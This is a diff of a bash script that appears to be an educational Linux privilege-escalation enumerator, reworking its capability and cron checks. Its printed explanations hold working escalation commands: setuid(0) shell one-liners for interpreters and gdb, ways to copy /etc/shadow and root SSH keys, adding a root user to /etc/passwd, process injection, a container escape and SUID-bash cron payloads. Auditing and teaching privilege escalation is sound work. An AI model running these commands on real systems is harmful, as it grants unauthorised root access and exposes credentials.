+        "/usr/lib/systemd/systemd-networkd:cap_net_admin,cap_net_bind_service,cap_net_raw"
+        
+        # GNOME/desktop components
+        "/usr/bin/gnome-keyring-daemon:cap_ipc_lock"
+    )
     
-    # Only show educational framework if dangerous capabilities found
-    if [ $has_dangerous_caps -eq 1 ]; then
-        log ""
-        teach "╔════════════════════════════════════════════════════════════╗"
-        teach "║  UNDERSTANDING CAPABILITIES - THE FUNDAMENTALS"
-        teach "╚════════════════════════════════════════════════════════════╝"
-        teach ""
-        teach "THE PROBLEM CAPABILITIES SOLVE:"
-        teach ""
-        teach "  Traditional Unix Security Model:"
-        teach "  • Root (UID 0): Can do EVERYTHING"
-        teach "  • Non-root: Can do very little"
-        teach "  • No middle ground"
-        teach ""
-        teach "  Real-world example - ping command:"
-        teach "  • Needs to send raw network packets (requires root)"
-        teach "  • Solution before capabilities: Make ping SUID root"
-        teach "  • Problem: Now ping runs with FULL root privileges"
-        teach "  • Risk: If ping has a bug, attacker gets full root"
-        teach ""
-        teach "  Solution with capabilities:"
-        teach "  • Give ping ONLY CAP_NET_RAW (raw socket access)"
-        teach "  • ping can send packets but can't read files, kill processes, etc."
-        teach "  • Much safer than full SUID root"
-        teach ""
-        teach "CAPABILITY vs SUID - KEY DIFFERENCES:"
-        teach ""
-        teach "  SUID Binary:"
-        teach "  • Runs with ALL permissions of the file owner (usually root)"
-        teach "  • If owner is root = full system control"
-        teach "  • All or nothing approach"
-        teach "  • Example: /usr/bin/passwd is SUID root"
-        teach ""
-        teach "  Capability-enabled Binary:"
-        teach "  • Has SPECIFIC permissions only"
-        teach "  • Can't do anything outside those specific capabilities"
-        teach "  • Granular control"
-        teach "  • Example: ping with CAP_NET_RAW can ONLY send raw packets"
-        teach ""
-        log ""
-    fi
+    # Check for dangerous capabilities
+    local has_dangerous=0
+    local dangerous_findings=""
     
-    # Now process the capabilities
-    echo "$cap_output" | while read line; do
-        local bin=$(echo "$line" | awk '{print $1}')
+    while IFS= read -r line; do
+        local binary=$(echo "$line" | awk '{print $1}')
         local caps=$(echo "$line" | awk '{print $3}')
         
-        caps_found=1
+        # Check if this is a whitelisted combination
+        local is_legit=0
+        for legit in "${legit_caps[@]}"; do
+            local legit_bin="${legit%%:*}"
+            local legit_cap="${legit##*:}"
+            
+            if [ "$binary" = "$legit_bin" ]; then
+                # Check if capabilities match (allowing for +ep suffix variations)
+                if echo "$caps" | grep -qF "$legit_cap"; then
+                    is_legit=1
+                    break
+                fi
+            fi
+        done
         
-        # Check for CAP_SETUID
+        # Skip if legitimate
+        if [ $is_legit -eq 1 ]; then
+            continue
+        fi
+        
+        # Check for dangerous capabilities
+        if echo "$caps" | grep -qE "cap_setuid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace|cap_sys_module"; then
+            has_dangerous=1
+            dangerous_findings="${dangerous_findings}${line}\n"
+        fi
+    done <<< "$cap_output"
+    
+    # === PHASE 3: CONDITIONAL EDUCATION (only if dangerous caps found) ===
+    if [ $has_dangerous -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  UNDERSTANDING CAPABILITIES - THE FUNDAMENTALS"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "THE PROBLEM:"
+        teach "  Apache web server needs to bind to port 80 (requires root)"
+        teach "  BUT Apache shouldn't be able to read /etc/shadow or SSH keys"
+        teach "  "
+        teach "  Old solution: Run entire Apache as root"
+        teach "  Problem: If Apache is compromised, attacker has full root"
+        teach "  "
+        teach "  New solution: Give Apache ONLY cap_net_bind_service"
+        teach "  Result: Can bind to port 80, but can't read sensitive files"
+        teach ""
+        teach "HOW CAPABILITIES WORK:"
+        teach "  Root's powers are split into 38 specific capabilities."
+        teach "  Each capability grants ONE specific privilege."
+        teach "  Examples:"
+        teach "    cap_net_bind_service → Bind to ports below 1024"
+        teach "    cap_net_raw → Send raw network packets (ping)"
+        teach "    cap_setuid → Change user ID (become another user)"
+        teach "    cap_dac_override → Bypass file permission checks"
+        teach ""
+        teach "CAPABILITY vs SUID:"
+        teach "  "
+        teach "  SUID root binary: ALL of root's powers"
+        teach "    • Can read any file"
+        teach "    • Can kill any process"
+        teach "    • Can load kernel modules"
+        teach "    • Can do literally everything root can do"
+        teach "  "
+        teach "  Binary with cap_net_raw: ONLY raw socket access"
+        teach "    • Can send raw packets"
+        teach "    • Cannot read /etc/shadow"
+        teach "    • Cannot kill processes"
+        teach "    • Cannot modify system files"
+        teach ""
+        teach "WHY ADMINS MISCONFIGURE CAPABILITIES:"
+        teach "  "
+        teach "  Scenario: Admin needs Python script to switch between users"
+        teach "  Admin thinks: 'I'll give Python cap_setuid for my script'"
+        teach "  "
+        teach "  What they don't realize:"
+        teach "  • ANYONE can run /usr/bin/python3"
+        teach "  • ANYONE can call os.setuid(0) in their own Python code"
+        teach "  • It's like leaving a 'become root' button in /usr/bin"
+        teach "  "
+        teach "  The admin gave the BINARY the power, not just THEIR script."
+        teach "  This is the critical misunderstanding that creates vulnerabilities."
+        teach ""
+        teach "WHY SHELLS DROP PRIVILEGES:"
+        teach "  When SUID binary spawns bash/sh, shell checks if EUID ≠ RUID"
+        teach "  If mismatched → drops EUID to match RUID (security feature)"
+        teach "  Solution: Use -p flag to preserve privileges"
+        teach "    bash -p → preserves elevated effective UID"
+        log ""
+    fi
+    
+    # === PHASE 4: REPORT FINDINGS with SPECIFIC EXPLOITATION ===
+    if [ $has_dangerous -eq 0 ]; then
+        ok "Only standard/safe capabilities found (network tools, systemd)"
+        return
+    fi
+    
+    # Process dangerous findings
+    echo -e "$dangerous_findings" | while IFS= read -r line; do
+        [ -z "$line" ] && continue
+        
+        local binary=$(echo "$line" | awk '{print $1}')
+        local caps=$(echo "$line" | awk '{print $3}')
+        local basename=$(basename "$binary")
+        
+        # === cap_setuid - Most Critical ===
         if echo "$caps" | grep -q "cap_setuid"; then
-            critical "CAP_SETUID on $bin - Become root immediately"
-            vuln "CAP_SETUID found: $bin"
+            critical "CAP_SETUID on $binary - Become root immediately"
+            vuln "CAP_SETUID found: $binary"
             log ""
-            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "╔═══════════════════════════════════════════════════════════╗"
             teach "║  CAP_SETUID - Change User ID Capability"
-            teach "╚════════════════════════════════════════════════════════════╝"
+            teach "╚═══════════════════════════════════════════════════════════"
             teach ""
             teach "WHAT IT IS:"
-            teach "  CAP_SETUID allows a process to change its user ID to any user,"
-            teach "  including root (UID 0). This is the same power the 'su' and"
-            teach "  'sudo' commands use to switch users."
+            teach "  Allows process to change its user ID to ANY user, including root."
+            teach "  This is the power that 'su' and 'sudo' use to switch users."
             teach ""
             teach "WHY IT EXISTS:"
-            teach "  Some programs need to switch between users:"
-            teach "  • Login programs (switch from login screen to your user)"
-            teach "  • SSH daemon (becomes your user after authentication)"
-            teach "  • su/sudo commands (change to root or other users)"
+            teach "  Login programs need to switch from login screen to your user."
+            teach "  SSH daemon becomes your user after authentication."
+            teach "  su/sudo need to change to root or other users."
             teach ""
             teach "THE EXPLOITATION:"
-            teach "  The setuid() system call changes the process's user ID."
+            teach "  setuid() system call changes process's user ID."
             teach "  Normally only root can call setuid(0) to become root."
-            teach "  With CAP_SETUID, ANY process can call setuid(0)!"
+            teach "  With cap_setuid, ANY process can call setuid(0)!"
             teach ""
             teach "  Exploit chain:"
-            teach "  1. Run the binary with CAP_SETUID"
-            teach "  2. Binary inherits the CAP_SETUID capability"
+            teach "  1. Run binary with cap_setuid"
+            teach "  2. Binary inherits the capability"
             teach "  3. Make it call setuid(0) - become root"
-            teach "  4. Spawn a shell - now you're root"
+            teach "  4. Spawn shell - now you're root"
             teach ""
             
-            local basename=$(basename "$bin")
+            # Provide binary-specific exploitation
             case $basename in
                 python*|python)
                     teach "EXPLOITATION FOR PYTHON:"
-                    teach "  Python can call setuid() via the os module:"
-                    teach "  $bin -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+                    teach "  $binary -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'"
                     teach ""
-                    teach "  Step by step:"
+                    teach "  What this does:"
                     teach "  1. Import os module (operating system interface)"
                     teach "  2. os.setuid(0) - Change to UID 0 (root)"
                     teach "  3. os.system() - Execute /bin/bash as root"
-                    teach "  4. You now have a root shell"
+                    teach "  4. -p flag preserves root privileges in shell"
                     ;;
+                    
                 perl)
                     teach "EXPLOITATION FOR PERL:"
-                    teach "  Perl has POSIX module with setuid function:"
-                    teach "  $bin -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
+                    teach "  $binary -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\", \"-p\";'"
                     teach ""
                     teach "  Breakdown:"
-                    teach "  1. Load POSIX module"
-                    teach "  2. Call setuid(0)"
-                    teach "  3. exec() replaces current process with /bin/sh"
+                    teach "  1. Load POSIX module (UNIX system calls)"
+                    teach "  2. Call setuid(0) to become root"
+                    teach "  3. exec() replaces process with bash"
                     ;;
+                    
                 ruby)
                     teach "EXPLOITATION FOR RUBY:"
-                    teach "  Ruby's Process module handles user switching:"
-                    teach "  $bin -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
-                    teach ""
-                    teach "  Process::Sys.setuid(0) changes to root, then spawn shell"
+                    teach "  $binary -e 'Process::Sys.setuid(0); exec \"/bin/bash\", \"-p\"'"
                     ;;
+                    
                 php)
                     teach "EXPLOITATION FOR PHP:"
-                    teach "  PHP has posix_setuid function:"
-                    teach "  $bin -r 'posix_setuid(0); system(\"/bin/sh\");'"
-                    teach ""
-                    teach "  -r flag runs PHP code directly"
+                    teach "  $binary -r 'posix_setuid(0); system(\"/bin/bash -p\");'"
                     ;;
+                    
                 node|nodejs)
                     teach "EXPLOITATION FOR NODE.JS:"
-                    teach "  Node's process object has setuid method:"
-                    teach "  $bin -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"
-                    teach ""
-                    teach "  process.setuid(0) becomes root, then spawn interactive shell"
+                    teach "  $binary -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'"
                     ;;
+                    
                 gdb)
                     teach "EXPLOITATION FOR GDB:"
-                    teach "  GDB can execute system calls:"
-                    teach "  $bin -nx -ex 'python import os; os.setuid(0)' -ex 'shell /bin/sh' -ex quit"
+                    teach "  $binary -nx -ex 'python import os; os.setuid(0)' -ex 'shell /bin/bash -p' -ex quit"
                     ;;
+                    
                 *)
                     teach "GENERAL APPROACH:"
                     teach "  This binary can call setuid(0) to become root."
-                    teach "  Research how $basename can:"
-                    teach "  1. Call the setuid() system call"
-                    teach "  2. Execute shell commands"
-                    teach "  3. If it's a scripting language, use its setuid function"
-                    teach "  4. If it's compiled, use GDB to call setuid manually"
+                    teach "  Find how $basename can execute system calls:"
                     teach ""
-                    teach "  GDB method (works for any binary):"
-                    teach "  gdb -q $bin"
-                    teach "  (gdb) call (int)setuid(0)"
-                    teach "  (gdb) shell /bin/sh"
+                    teach "  Method 1 - If it's a scripting language:"
+                    teach "    Look for setuid() function in the language"
+                    teach ""
+                    teach "  Method 2 - Use GDB (works for any binary):"
+                    teach "    gdb -q $binary"
+                    teach "    (gdb) call (int)setuid(0)"
+                    teach "    (gdb) shell /bin/bash -p"
+                    teach ""
+                    teach "  Method 3 - Check GTFOBins:"
+                    teach "    https://gtfobins.github.io/#$basename"
                     ;;
             esac
             log ""
         fi
         
-        # Check for CAP_DAC_READ_SEARCH
+        # === cap_dac_read_search - Read Any File ===
         if echo "$caps" | grep -q "cap_dac_read_search"; then
-            critical "CAP_DAC_READ_SEARCH on $bin - Read /etc/shadow and SSH keys"
-            vuln "CAP_DAC_READ_SEARCH found: $bin"
+            critical "CAP_DAC_READ_SEARCH on $binary - Read /etc/shadow and SSH keys"
+            vuln "CAP_DAC_READ_SEARCH found: $binary"
             log ""
-            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "╔═══════════════════════════════════════════════════════════╗"
             teach "║  CAP_DAC_READ_SEARCH - Bypass Read Permission Checks"
-            teach "╚════════════════════════════════════════════════════════════╝"
+            teach "╚═══════════════════════════════════════════════════════════"
             teach ""
             teach "WHAT IT IS:"
             teach "  DAC = Discretionary Access Control (normal file permissions)"
@@ -2846,285 +3211,615 @@ enum_capabilities() {
             teach ""
             teach "WHY IT EXISTS:"
             teach "  Backup programs need to read all files to create backups."
-            teach "  Instead of running as full root, they get CAP_DAC_READ_SEARCH."
+            teach "  Instead of running as full root, they get cap_dac_read_search."
             teach ""
             teach "WHAT YOU CAN READ:"
             teach "  • /etc/shadow (password hashes)"
             teach "  • /root/.ssh/id_rsa (root's SSH private key)"
             teach "  • /root/.bash_history (root's command history)"
             teach "  • Any user's private files"
-            teach "  • Database files, configuration files, etc."
-            teach ""
-            teach "EXPLOITATION:"
-            teach "  The binary can read files but you need to make it DO the reading."
+            teach "  • Database files, configuration files with secrets"
             teach ""
             
-            local basename=$(basename "$bin")
             case $basename in
                 tar)
                     teach "EXPLOITATION WITH TAR:"
-                    teach "  tar can archive (and thus read) any file:"
-                    teach "  $bin -czf /tmp/shadow.tar.gz /etc/shadow"
+                    teach "  $binary -czf /tmp/shadow.tar.gz /etc/shadow"
                     teach "  cd /tmp && tar -xzf shadow.tar.gz"
                     teach "  cat etc/shadow"
                     teach ""
-                    teach "  Now crack the hashes with john or hashcat"
+                    teach "  Now crack hashes: john etc/shadow"
                     ;;
+                    
                 dd)
                     teach "EXPLOITATION WITH DD:"
-                    teach "  dd reads and writes raw data:"
-                    teach "  $bin if=/etc/shadow of=/tmp/shadow"
+                    teach "  $binary if=/etc/shadow of=/tmp/shadow"
                     teach "  cat /tmp/shadow"
                     ;;
+                    
                 rsync)
                     teach "EXPLOITATION WITH RSYNC:"
-                    teach "  $bin /etc/shadow /tmp/shadow"
-                    teach "  cat /tmp/shadow"
+                    teach "  $binary /etc/shadow /tmp/shadow"
+                    teach "  $binary /root/.ssh/id_rsa /tmp/root_key"
                     ;;
+                    
+                zip)
+                    teach "EXPLOITATION WITH ZIP:"
+                    teach "  $binary /tmp/secrets.zip /etc/shadow /root/.ssh/id_rsa"
+                    teach "  unzip /tmp/secrets.zip"
+                    ;;
+                    
                 *)
-                    teach "GENERAL APPROACH:"
-                    teach "  If $basename can read files, use it to read sensitive files:"
+                    teach "EXPLOITATION STRATEGY:"
+                    teach "  Use $basename to read and copy sensitive files:"
                     teach "  • /etc/shadow - crack passwords offline"
-                    teach "  • /root/.ssh/id_rsa - use for SSH access"
+                    teach "  • /root/.ssh/id_rsa - use for SSH access as root"
                     teach "  • /root/.bash_history - find credentials in commands"
-                    teach "  • Application config files - database passwords"
+                    teach "  • Application configs - database passwords, API keys"
                     ;;
             esac
             log ""
         fi
         
-        # Check for CAP_DAC_OVERRIDE
+        # === cap_dac_override - Write Any File ===
         if echo "$caps" | grep -q "cap_dac_override"; then
-            critical "CAP_DAC_OVERRIDE on $bin - Write to any file including /etc/passwd"
-            vuln "CAP_DAC_OVERRIDE found: $bin"
+            critical "CAP_DAC_OVERRIDE on $binary - Write to /etc/passwd, /etc/shadow"
+            vuln "CAP_DAC_OVERRIDE found: $binary"
             log ""
-            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "╔═══════════════════════════════════════════════════════════╗"
             teach "║  CAP_DAC_OVERRIDE - Bypass ALL File Permission Checks"
-            teach "╚════════════════════════════════════════════════════════════╝"
+            teach "╚═══════════════════════════════════════════════════════════"
             teach ""
             teach "WHAT IT IS:"
-            teach "  Like CAP_DAC_READ_SEARCH, but for WRITE permissions too."
+            teach "  Like cap_dac_read_search, but for WRITE permissions too."
             teach "  You can READ and WRITE any file, regardless of permissions."
             teach "  This is almost as powerful as being root."
             teach ""
             teach "WHY IT EXISTS:"
             teach "  System management tools need to modify protected files."
-            teach "  Package managers, system updaters, etc."
+            teach "  Package managers, system updaters need this capability."
             teach ""
             teach "WHAT YOU CAN DO:"
             teach "  • Modify /etc/passwd (add root user)"
             teach "  • Modify /etc/shadow (remove root's password)"
             teach "  • Modify /etc/sudoers (give yourself sudo access)"
-            teach "  • Replace /bin/bash with a backdoored version"
             teach "  • Inject SSH keys into /root/.ssh/authorized_keys"
+            teach "  • Replace system binaries with backdoors"
             teach ""
-            teach "EXPLOITATION STRATEGY:"
+            teach "EXPLOITATION STRATEGIES:"
+            teach ""
             teach "  Option 1 - Add root user to /etc/passwd:"
-            teach "    echo 'hacker::0:0::/root:/bin/bash' | $bin tee -a /etc/passwd"
-            teach "    su hacker (no password needed)"
+            teach "    Generate hash: openssl passwd -1 -salt xyz password123"
+            teach "    echo 'hacker:\$1\$xyz\$HASH:0:0::/root:/bin/bash' | $binary tee -a /etc/passwd"
+            teach "    su hacker"
             teach ""
             teach "  Option 2 - Remove root password from /etc/shadow:"
-            teach "    If binary can edit files, remove the hash between first and second :"
-            teach "    Before: root:\$6\$long_hash:..."
-            teach "    After:  root::..."
-            teach "    su root (no password)"
+            teach "    Use $basename to edit /etc/shadow"
+            teach "    Change: root:\$6\$long_hash:... → root::..."
+            teach "    su root (no password needed)"
             teach ""
             teach "  Option 3 - Inject SSH key:"
-            teach "    echo 'YOUR_PUBLIC_KEY' | $bin tee -a /root/.ssh/authorized_keys"
+            teach "    echo 'YOUR_PUBLIC_KEY' | $binary tee -a /root/.ssh/authorized_keys"
             teach "    ssh -i your_private_key root@localhost"
             log ""
         fi
         
-        # Check for CAP_SYS_PTRACE
+        # === cap_sys_ptrace - Debug Processes ===
         if echo "$caps" | grep -q "cap_sys_ptrace"; then
-            vuln "CAP_SYS_PTRACE found: $bin"
+            warn "CAP_SYS_PTRACE found: $binary"
             log ""
-            teach "╔════════════════════════════════════════════════════════════╗"
-            teach "║  CAP_SYS_PTRACE - Debug and Inject Into Any Process"
-            teach "╚════════════════════════════════════════════════════════════╝"
+            teach "╔═══════════════════════════════════════════════════════════╗"
+            teach "║  CAP_SYS_PTRACE - Debug and Inject Into Processes"
+            teach "╚═══════════════════════════════════════════════════════════"
             teach ""
             teach "WHAT IT IS:"
             teach "  ptrace() is the system call debuggers use to inspect/control"
-            teach "  other processes. CAP_SYS_PTRACE lets you debug ANY process,"
+            teach "  other processes. cap_sys_ptrace lets you debug ANY process,"
             teach "  including those owned by root."
             teach ""
-            teach "WHY IT EXISTS:"
-            teach "  Debuggers (gdb, strace) need to attach to processes."
-            teach "  System monitoring tools need to inspect running programs."
-            teach ""
             teach "EXPLOITATION:"
-            teach "  If you can attach to a root process, you can:"
-            teach "  1. Inject shellcode (malicious code)"
-            teach "  2. Make it call system() to execute commands"
-            teach "  3. Hijack its execution flow"
-            teach ""
-            teach "EXAMPLE - Inject into a root process:"
-            teach "  1. Find a root process:"
-            teach "     ps aux | grep root"
-            teach "  2. Use gdb to attach:"
-            teach "     gdb -p <PID>"
-            teach "  3. Call system() from within the process:"
+            teach "  1. Find root process: ps aux | grep root"
+            teach "  2. Attach with gdb: gdb -p <PID>"
+            teach "  3. Inject commands:"
             teach "     (gdb) call (int)system(\"chmod u+s /bin/bash\")"
-            teach "  4. Detach:"
-            teach "     (gdb) detach"
-            teach "  5. /bin/bash is now SUID root"
-            teach "     /bin/bash -p"
-            teach ""
-            teach "SIMPLER METHOD - shellcode injection tools:"
-            teach "  Use tools like 'linux-inject' to automate process injection"
+            teach "  4. Detach: (gdb) detach"
+            teach "  5. Execute SUID bash: /bin/bash -p"
             log ""
         fi
         
-        # Check for CAP_SYS_ADMIN
+        # === cap_sys_admin - God Mode ===
         if echo "$caps" | grep -q "cap_sys_admin"; then
-            critical "CAP_SYS_ADMIN on $bin - Nearly equivalent to root"
-            vuln "CAP_SYS_ADMIN found: $bin"
+            critical "CAP_SYS_ADMIN on $binary - Nearly equivalent to root"
+            vuln "CAP_SYS_ADMIN found: $binary"
             log ""
-            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "╔═══════════════════════════════════════════════════════════╗"
             teach "║  CAP_SYS_ADMIN - The 'God Mode' Capability"
-            teach "╚════════════════════════════════════════════════════════════╝"
+            teach "╚═══════════════════════════════════════════════════════════"
             teach ""
             teach "WHAT IT IS:"
-            teach "  CAP_SYS_ADMIN is a catch-all for 'system administration' tasks."
+            teach "  cap_sys_admin is a catch-all for 'system administration' tasks."
             teach "  It's extremely broad and provides many root-equivalent powers."
             teach "  Often called 'the new root' because it's so powerful."
             teach ""
-            teach "WHAT IT ALLOWS:"
-            teach "  • Mount filesystems"
-            teach "  • Load kernel modules"
-            teach "  • Perform system administration operations"
-            teach "  • Manipulate namespaces"
-            teach "  • Many other privileged operations"
+            teach "WHY IT'S SO BROAD:"
+            teach "  Created as a catch-all for operations that 'need admin privileges'"
+            teach "  but don't fit other capabilities. Over time, dozens of operations"
+            teach "  got added to it. Now it's almost as powerful as full root."
             teach ""
-            teach "WHY IT'S DANGEROUS:"
-            teach "  It was supposed to be for 'admin operations that don't fit"
-            teach "  other capabilities'. But so many things got added to it that"
-            teach "  having CAP_SYS_ADMIN is almost the same as being root."
+            teach "CONCRETE EXAMPLE - Container Escape:"
             teach ""
+            teach "  Scenario: You're in a Docker container with cap_sys_admin"
+            teach "  "
+            teach "  1. List host's block devices:"
+            teach "     fdisk -l"
+            teach "     (Shows /dev/sda1, /dev/vda1, etc.)"
+            teach "  "
+            teach "  2. Create mount point:"
+            teach "     mkdir /mnt/host"
+            teach "  "
+            teach "  3. Mount host's root filesystem:"
+            teach "     mount /dev/sda1 /mnt/host"
+            teach "     (Normally blocked, but cap_sys_admin allows it)"
+            teach "  "
+            teach "  4. Chroot to host filesystem:"
+            teach "     chroot /mnt/host /bin/bash"
+            teach "  "
+            teach "  5. You're now on the HOST system as root, escaped the container"
+            teach ""
+            teach "WHY THIS WORKS:"
+            teach "  cap_sys_admin allows mounting filesystems (admin operation)."
+            teach "  Containers share the host's devices (/dev/sda1 exists inside)."
+            teach "  Once mounted, you can access the real host filesystem."
+            teach "  Container isolation is broken - you're on the host now."
+            teach ""
+            teach "OTHER EXPLOITATION PATHS:"
+            teach "  • Load malicious kernel module (if cap_sys_module also present)"
+            teach "  • Manipulate /proc/sys to weaken security settings"
+            teach "  • Create new namespaces with elevated privileges"
+            teach "  • Perform quota operations to fill disk/DOS"
+            log ""
+        fi
+        
+        # === cap_sys_module - Load Kernel Modules ===
+        if echo "$caps" | grep -q "cap_sys_module"; then
+            critical "CAP_SYS_MODULE on $binary - Load kernel modules for root"
+            vuln "CAP_SYS_MODULE found: $binary"
+            log ""
             teach "EXPLOITATION:"
-            teach "  Multiple paths to root with CAP_SYS_ADMIN:"
-            teach ""
-            teach "  Option 1 - Mount host filesystem (if in container):"
-            teach "  Option 2 - Load kernel module with backdoor"
-            teach "  Option 3 - Manipulate /proc/sys to weaken security"
-            teach ""
-            teach "  This capability is too broad to cover all exploitation paths."
-            teach "  Research specific to your situation."
-            log ""
-        fi
-        
-        # Other capabilities
-        if echo "$caps" | grep -qE "cap_net_admin|cap_net_raw"; then
-            info "Network capabilities: $caps on $bin"
-            teach "Network capabilities detected - useful for network manipulation"
-            teach "  but typically not direct privilege escalation paths"
-            log ""
-        fi
-        
-        if echo "$caps" | grep -qE "cap_sys_module"; then
-            critical "CAP_SYS_MODULE on $bin - Load kernel modules"
-            vuln "CAP_SYS_MODULE found: $bin"
-            teach "This binary can load kernel modules - create a malicious module"
-            teach "  to get root-level kernel code execution"
+            teach "  Create malicious kernel module for root-level code execution"
+            teach "  This requires kernel development knowledge"
+            teach "  Kernel module runs in kernel space = complete system control"
             log ""
         fi
     done
     
-    if [ $caps_found -eq 0 ]; then
-        ok "Only harmless capabilities found (network-related, not exploitable)"
-        return
-    fi
-    
-    # Only show key takeaways if we found dangerous capabilities
-    if [ $has_dangerous_caps -eq 1 ]; then
-        log ""
-        teach "═══════════════════════════════════════════════════════════════"
-        teach "CAPABILITIES - KEY TAKEAWAYS"
-        teach "═══════════════════════════════════════════════════════════════"
-        teach ""
-        teach "MENTAL MODEL:"
-        teach "  Think of capabilities as 'root lite' - specific pieces of root's"
-        teach "  power distributed individually instead of all-or-nothing."
-        teach ""
-        teach "THE BIG THREE FOR PRIVILEGE ESCALATION:"
-        teach "  1. CAP_SETUID = Can become root directly (most powerful)"
-        teach "  2. CAP_DAC_OVERRIDE = Can read/write any file (almost as good)"
-        teach "  3. CAP_SYS_ADMIN = Swiss army knife (way too broad)"
-        teach ""
-        teach "HOW TO CHECK FOR CAPABILITIES:"
-        teach "  getcap -r / 2>/dev/null"
-        teach "  (Searches entire filesystem for capability-enabled binaries)"
-        teach ""
-        teach "DEFENSIVE PERSPECTIVE:"
-        teach "  Capabilities are actually a SECURITY IMPROVEMENT over SUID."
-        teach "  They follow the principle of least privilege."
-        teach "  But if misconfigured (like CAP_SETUID on python), they're just"
-        teach "  as dangerous as SUID root."
-        log ""
-    fi
+    # === PHASE 5: SUMMARY ===
+    log ""
+    teach "═══════════════════════════════════════════════════════════"
+    teach "CAPABILITIES - KEY TAKEAWAYS"
+    teach "═══════════════════════════════════════════════════════════"
+    teach ""
+    teach "MENTAL MODEL FOR CAPABILITIES:"
+    teach ""
+    teach "  When you see a capability during enumeration, ask these questions:"
+    teach ""
+    teach "  1. What does this capability let me DO?"
+    teach "     → Read files? Change UID? Mount filesystems? Network operations?"
+    teach "  "
+    teach "  2. Can I CONTROL what the binary does with that power?"
+    teach "     → Python/Perl/Ruby = Full control (write any code)"
+    teach "     → Compiled binary = Limited (must find exploitable behavior)"
+    teach "     → Shell scripts = Full control if writable"
+    teach "  "
+    teach "  3. Does this binary EXECUTE other things I can influence?"
+    teach "     → tar with cap_dac_override calls writable script = win"
+    teach "     → systemd with caps might execute service files you can modify"
+    teach ""
+    teach "EXAMPLES:"
+    teach "  cap_setuid on /usr/bin/python3:"
+    teach "    1. What? Change user ID to anyone, including root"
+    teach "    2. Control? YES - I can write Python code: os.setuid(0)"
+    teach "    3. Execute? YES - Python executes my code"
+    teach "    → INSTANT ROOT"
+    teach ""
+    teach "  cap_net_raw on /bin/ping:"
+    teach "    1. What? Send raw network packets"
+    teach "    2. Control? NO - ping is compiled, does one thing"
+    teach "    3. Execute? NO - doesn't call other programs"
+    teach "    → Not exploitable (this is the intended use case)"
+    teach ""
+    teach "THE BIG THREE FOR PRIVILEGE ESCALATION:"
+    teach "  1. cap_setuid = Become root directly (if on interpreter)"
+    teach "  2. cap_dac_override = Read/write any file (modify /etc/passwd)"
+    teach "  3. cap_sys_admin = Mount filesystems, escape containers"
+    teach ""
+    teach "HOW TO CHECK CAPABILITIES:"
+    teach "  getcap -r / 2>/dev/null"
+    teach "  Focus on: interpreters (python, perl, ruby, php, node)"
+    teach "           file utilities (tar, dd, rsync)"
+    teach "           debug tools (gdb)"
+    teach ""
+    teach "WHY THIS MATTERS:"
+    teach "  Capabilities are a security improvement over SUID root."
+    teach "  But 'security improvement' ≠ 'secure'"
+    teach "  One misconfigured capability = game over"
+    teach "  Admins often don't understand the implications of capabilities"
+    log ""
 }
-# === CRON JOBS ===
+# === CRON JOB ANALYSIS ===
 enum_cron() {
     section "CRON JOB ANALYSIS"
     
-    explain_concept "Cron Jobs" \
-        "Cron runs scheduled tasks as different users. If a root cron job calls a script you can write to, or uses wildcards unsafely, you control what root executes." \
-        "Admins create cron jobs for backups, maintenance, monitoring. Common mistakes: writable script files, relative paths, wildcard abuse (tar * can be exploited with --checkpoint-action)." \
-        "Attack vectors:\n  1. Writable script called by cron\n  2. Script in writable directory\n  3. Wildcard injection (tar *, rsync *)\n  4. PATH hijacking in cron environment"
+    # === PHASE 1: SILENT SCAN - Collect all findings first ===
+    local found_issues=0
+    local temp_writable_scripts="/tmp/.learnpeas_cron_scripts_$$"
+    local temp_writable_dirs="/tmp/.learnpeas_cron_dirs_$$"
+    local temp_wildcard_jobs="/tmp/.learnpeas_cron_wildcards_$$"
+    local temp_writable_files="/tmp/.learnpeas_cron_files_$$"
+    
+    # Cleanup function
+    cleanup_cron_temps() {
+        rm -f "$temp_writable_scripts" "$temp_writable_dirs" "$temp_wildcard_jobs" "$temp_writable_files" 2>/dev/null
+    }
+    trap cleanup_cron_temps RETURN
     
     # Check system crontab
     if [ -r /etc/crontab ]; then
-        info "System crontab contents:"
-        grep -v "^#" /etc/crontab 2>/dev/null | grep -v "^$" | while read line; do
-            log "  $line"
+        while IFS= read -r line; do
+            # Skip comments and empty lines
+            echo "$line" | grep -qE "^#|^$" && continue
             
-            # Extract script paths
-            local script=$(echo "$line" | grep -oE '/[^ ]+\.(sh|py|pl|rb)')
-            if [ -n "$script" ]; then
-                if [ -w "$script" ]; then
-                    critical "Writable cron script: $script - Inject payload for root execution"
-                    vuln "Cron script is WRITABLE: $script"
-                    teach "Inject payload: echo 'chmod u+s /bin/bash' >> $script"
-                elif [ -w "$(dirname "$script")" ]; then
-                    critical "Cron script directory writable: $(dirname "$script")"
-                    vuln "Cron script directory is WRITABLE: $(dirname "$script")"
-                    teach "Replace the script or create a symlink"
+            # Extract script paths from the line
+            local scripts=$(echo "$line" | grep -oE '/[^ ]+\.(sh|py|pl|rb|php|bash)')
+            
+            for script in $scripts; do
+                if [ -n "$script" ] && [ -f "$script" ]; then
+                    if [ -w "$script" ]; then
+                        echo "$script|$line" >> "$temp_writable_scripts"
+                        found_issues=1
+                    elif [ -d "$(dirname "$script")" ] && [ -w "$(dirname "$script")" ]; then
+                        echo "$script|$line|$(dirname "$script")" >> "$temp_writable_dirs"
+                        found_issues=1
+                    fi
+                fi
+            done
+            
+            # Check for wildcards (exclude safe run-parts and common false positives)
+            if echo "$line" | grep -qE '\*' && ! echo "$line" | grep -qE 'run-parts|logrotate|/\* \* \* \*'; then
